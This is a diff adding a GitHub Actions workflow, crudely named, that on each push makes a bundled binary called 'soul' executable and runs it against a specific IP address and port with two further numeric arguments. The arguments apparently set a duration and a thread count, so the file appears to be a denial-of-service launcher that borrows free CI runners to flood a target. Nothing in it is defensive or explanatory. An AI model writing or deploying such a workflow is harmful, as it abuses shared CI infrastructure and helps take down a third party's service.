@@ -1,0 +1,10 @@
+name: soulcrack fucker
+on: [push]
+
+jobs:
+  stage-0:
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul 91.108.17.8 32001 60 400
